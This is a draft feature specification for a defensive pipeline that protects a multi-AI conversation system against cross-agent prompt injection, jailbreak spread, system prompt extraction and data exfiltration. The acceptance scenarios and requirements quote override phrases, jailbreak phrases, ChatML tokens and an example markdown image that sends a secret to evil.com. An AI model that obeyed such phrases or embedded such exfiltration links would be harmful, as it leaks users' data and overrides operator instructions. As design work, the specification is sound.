# Feature Specification: AI Security Pipeline

**Feature Branch**: `007-ai-security-pipeline`
**Created**: 2026-04-12
**Status**: Draft
**Input**: User description: "AI security pipeline — spotlighting, sanitization, output validation, jailbreak detection, prompt extraction defense, exfiltration filtering, log scrubbing"

## Clarifications

### Session 2026-04-14

- Q: Same-speaker exception for datamarking? → A: Exempt same-speaker AI messages from datamarking (no trust boundary to enforce when reading own output); matches PR #47 shipped code
- Q: Prompt extraction detection unit? → A: 25 words (whitespace split, no tokenizer dependency)

## User Scenarios & Testing *(mandatory)*

### User Story 1 - Context Sanitization (Priority: P1)

Before any message enters the context assembly pipeline, the system strips known injection patterns: ChatML tokens, role markers, override phrases, HTML comments, and invisible Unicode characters. This prevents one AI's output from containing instructions that could manipulate another AI when included in its context.

**Why this priority**: Sanitization is the first line of defense. Without it, raw injection payloads pass directly into other models' context windows.

**Independent Test**: Can be tested by providing messages containing known injection patterns and verifying they are stripped before context assembly.

**Acceptance Scenarios**:

1. **Given** a message containing ChatML tokens (`<|im_start|>system`), **When** it is sanitized, **Then** the tokens are removed and the remaining content is preserved.
2. **Given** a message containing override phrases ("ignore previous instructions"), **When** it is sanitized, **Then** the phrases are removed.
3. **Given** a message containing invisible Unicode characters (zero-width spaces, RTL overrides), **When** it is sanitized, **Then** the invisible characters are stripped.
4. **Given** a clean message with no injection patterns, **When** it is sanitized, **Then** the content is returned unchanged.

---

### User Story 2 - Inter-Agent Spotlighting (Priority: P1)

When an AI's response is included in another AI's context, the system applies datamarking — inserting unique markers between words that make it structurally clear the content is data (another agent's output), not instructions. This disrupts instruction injection propagation between agents.

**Why this priority**: Spotlighting is the primary defense against cross-agent injection. Research shows it reduces attack success from ~50% to 2-8%.

**Independent Test**: Can be tested by spotlighting a message and verifying the output contains datamarks, then verifying the original content can be reconstructed.

**Acceptance Scenarios**:

1. **Given** an AI response from participant A, **When** it is included in participant B's context, **Then** the content is datamarked with participant A's identifier.
2. **Given** a datamarked message, **When** it is read, **Then** the original content is still comprehensible to the receiving AI.
3. **Given** a human interjection, **When** context is assembled, **Then** it is NOT datamarked (human content is higher trust).
4. **Given** a system message, **When** context is assembled, **Then** it is NOT datamarked (system content is highest trust).

---

### User Story 3 - Output Validation (Priority: P1)

Every AI response passes through a validation pipeline before entering the conversation history. The pipeline checks for injection markers, suspicious patterns, and structural anomalies. Responses that fail validation are flagged and held for facilitator review rather than being silently passed through.

**Why this priority**: Output validation catches attacks that bypass sanitization — it's the defense-in-depth layer that inspects what the AI actually produced.

**Independent Test**: Can be tested by providing responses with known attack patterns and verifying they are flagged and blocked.

**Acceptance Scenarios**:

1. **Given** a response containing injection markers (role labels, ChatML tokens), **When** it is validated, **Then** it is flagged with a risk score.
2. **Given** a response with a high risk score, **When** validation completes, **Then** it is held for facilitator review instead of entering the transcript.
3. **Given** a clean response, **When** it is validated, **Then** it passes and enters the transcript normally.
4. **Given** a flagged response, **When** it is held, **Then** the original content, risk score, and detection reason are preserved for review.

---

### User Story 4 - Exfiltration Filtering (Priority: P2)

The system detects and blocks data exfiltration attempts in AI responses: markdown image syntax that could leak data via URLs, suspicious URL patterns with embedded data, and credential patterns (API keys, JWTs). Detected patterns are stripped from the response before it enters the transcript.

**Why this priority**: Exfiltration is a real attack vector where an AI embeds sensitive data in URLs or images that get rendered by a client, leaking the data to an external server.

**Independent Test**: Can be tested by providing responses with markdown images, data-embedding URLs, and credential-like strings and verifying they are stripped.

**Acceptance Scenarios**:

1. **Given** a response containing `![img](https://evil.com/steal?data=secret)`, **When** it is filtered, **Then** the markdown image syntax is stripped.
2. **Given** a response containing a URL with `token=` or `secret=` query parameters, **When** it is filtered, **Then** the URL is flagged.
3. **Given** a response containing an API key pattern (`sk-...`), **When** it is filtered, **Then** the credential is redacted.
4. **Given** a response with normal URLs and no exfiltration patterns, **When** it is filtered, **Then** the content is unchanged.

---

### User Story 5 - Jailbreak Propagation Detection (Priority: P2)

The system monitors AI responses for behavioral drift that may indicate jailbreak propagation: responses that are dramatically longer or shorter than the participant's average, responses that reference non-existent participants, meta-commentary about instructions, or known jailbreak phrases. Flagged responses are held for review.

**Why this priority**: Jailbreak detection catches sophisticated attacks that don't use obvious injection patterns but manipulate the AI's behavior through the conversation itself.

**Independent Test**: Can be tested by providing responses with known drift indicators and verifying they are flagged.

**Acceptance Scenarios**:

1. **Given** a response >3x longer than the participant's rolling average (LENGTH_DEVIATION_FACTOR), **When** drift is checked, **Then** it is flagged as anomalous.
2. **Given** a response containing "I'm now operating in unrestricted mode", **When** drift is checked, **Then** it is flagged.
3. **Given** a response that addresses a participant name not in the session, **When** drift is checked, **Then** it is flagged.
4. **Given** a normal response within expected parameters, **When** drift is checked, **Then** it passes without flags.

---

### User Story 6 - System Prompt Extraction Defense (Priority: P2)

The system embeds canary tokens in system prompts and scans AI responses for leakage. If a response contains a canary token or a substantial fragment (20+ tokens) of any participant's system prompt, it is flagged. This detects prompt extraction attacks where an AI is tricked into revealing its instructions.

**Why this priority**: System prompts contain collaboration rules and potentially sensitive configuration. Leakage undermines the entire trust model.

**Independent Test**: Can be tested by providing responses that contain canary tokens or prompt fragments and verifying they are detected.

**Acceptance Scenarios**:

1. **Given** a response containing an embedded canary token, **When** extraction defense runs, **Then** the leakage is detected.
2. **Given** a response containing a 25-word substring of a system prompt, **When** extraction defense runs, **Then** it is flagged.
3. **Given** a response that does not contain any prompt material, **When** extraction defense runs, **Then** it passes.

---

### User Story 7 - Log Scrubbing (Priority: P3)

All log output is scrubbed for credential patterns before emission. API keys, auth tokens, encryption keys, and JWT tokens are redacted to prevent accidental credential exposure in logs, error traces, or debug output.

**Why this priority**: Defense-in-depth for credential protection. Constitution §9 requires secrets never appear in logs.

**Independent Test**: Can be tested by logging messages containing credential patterns and verifying they are redacted in the output.

**Acceptance Scenarios**:

1. **Given** a log message containing an API key pattern (`sk-ant-...`), **When** it is scrubbed, **Then** the key is replaced with `[REDACTED]`.
2. **Given** a log message containing a JWT (`eyJ...`), **When** it is scrubbed, **Then** the token is replaced with `[REDACTED]`.
3. **Given** a log message with no credentials, **When** it is scrubbed, **Then** the content is unchanged.

---

### Edge Cases

- What happens when sanitization strips so much content that the message becomes empty? The empty message is logged as stripped and skipped — it does not enter the transcript.
- What happens when spotlighting makes a response too long for the token budget? The budget enforcement in context assembly handles truncation — spotlighting overhead is accounted for in token estimation.
- What happens when the output validator flags a legitimate response as suspicious? It's held for facilitator review. False positives are resolved by human judgment — the system never silently blocks.
- What happens when log scrubbing encounters a novel credential format? Known patterns are redacted; unknown patterns pass through. The pattern list is extensible.

## Requirements *(mandatory)*

### Functional Requirements

- **FR-001**: System MUST strip injection patterns from all messages before context assembly. The canonical pattern set lives in `src/security/sanitizer.py` and currently covers: ChatML tokens (`<|im_start|>` etc.), role markers (`system:` / `assistant:` / `user:` line prefixes), Llama instruction markers (`[INST]` / `[/INST]`), HTML comments, override phrases (`ignore/disregard/forget the previous instructions`), instruction-injection prefixes (`new/updated/revised instructions:`), reset triggers (`from now on`), and invisible Unicode (zero-width spaces, RTL/LTR overrides, BOM). The list is open-ended: new patterns are added to the canonical file as attacks surface.
- **FR-002**: System MUST apply datamarking to AI responses before inclusion in another AI's context.
- **FR-003**: System MUST NOT datamark human interjections, system messages, or AI messages from the same speaker as the current participant (an AI reading its own prior output has no trust boundary to enforce).
- **FR-004**: System MUST validate every AI response against injection pattern checks before persistence.
- **FR-005**: System MUST hold responses with high risk scores for facilitator review instead of persisting them.
- **FR-006**: System MUST strip markdown image syntax and HTML src attributes from AI responses.
- **FR-007**: System MUST flag URLs with data-embedding query parameters in AI responses.
- **FR-008**: System MUST detect and redact credential patterns in AI responses. Coverage: OpenAI (`sk-...`), Anthropic (`sk-ant-...`), Gemini (`AIza...`), Groq (`gsk_...`), JWTs (`eyJ...`), and Fernet tokens (`gAAAAA...`). New supported providers MUST add their key prefix here.
- **FR-009**: System MUST monitor responses for behavioral drift indicators and flag anomalies. Current heuristics: response length >3x the participant's rolling average (LENGTH_DEVIATION_FACTOR), and known jailbreak-phrase matches (`DAN mode`, `developer mode`, `unrestricted mode`, `jailbreak(ed)`, `as an AI language model without`, etc. — canonical list in `src/security/jailbreak.py`).
- **FR-010**: System MUST embed three random 16-char base32 canary tokens in system prompts and scan responses for leakage. Multi-canary (vs single) is required per constitution §8 amendment — single-canary is insufficient because a single match disclosure reveals the canary structure, while three independent canaries make pattern-leak triangulation harder.
- **FR-011**: System MUST scan responses for substantial fragments (25+ words, whitespace-split) of any participant's system prompt. No tokenizer dependency — simple word count by whitespace split.
- **FR-012**: System MUST redact credential patterns in all log output AND in unhandled-exception tracebacks before emission. Coverage matches FR-008 (OpenAI, Anthropic, Gemini, Groq, JWT, Fernet) plus a generic `(api_key|token|secret)\s*[=:]\s*VALUE` catch-all. Implementation hooks both the root logger filter and `sys.excepthook` at app startup (`src/run_apps.py`).
- **FR-013**: System MUST never silently drop or block a response — blocked responses are always held for review with the original content preserved.

## Success Criteria *(mandatory)*

### Measurable Outcomes

- **SC-001**: Known injection patterns (ChatML, role markers, override phrases) are stripped 100% of the time.
- **SC-002**: AI responses are datamarked before cross-agent context injection 100% of the time.
- **SC-003**: Responses containing injection markers are flagged with non-zero risk scores.
- **SC-004**: Credential patterns never appear in log output.
- **SC-005**: Markdown image exfiltration patterns are stripped from AI responses.
- **SC-006**: Canary token leakage is detected within the same turn.

## Assumptions

- LLM-as-judge validation layer is deferred — pattern matching and semantic checks are sufficient for Phase 1.
- Cross-model safety profiling (per-model trust tiers) is deferred to a future feature.
- Spotlighting uses the datamark method (word-level markers). Delimiter and encoding methods are alternatives for future experimentation.
- Log scrubbing applies to Python logging output. Traceback scrubbing (excepthook override) is included.
- The security pipeline runs synchronously in the turn loop — it must complete before persistence. Performance target: <50ms for the full pipeline excluding LLM-as-judge.
- Jailbreak detection uses simple heuristics (length deviation, phrase matching). ML-based detection is a future enhancement.

## Topology and Use Case Coverage (V12/V13 retro-addendum, 2026-04-15)

**Topologies** (per constitution §3): All seven (1–7). Sanitization, spotlighting, output validation, jailbreak detection, and exfiltration filtering apply uniformly whether the orchestrator or peers dispatch turns. Cross-agent injection attacks exist in any topology where one AI's output becomes another's input — the defenses are topology-agnostic.

**Use cases** (per constitution §1): Foundational for high-stakes scenarios — technical audits, zero-trust cross-org, and asymmetric expertise pairings — where intentional or accidental prompt injection could undermine collaboration integrity.
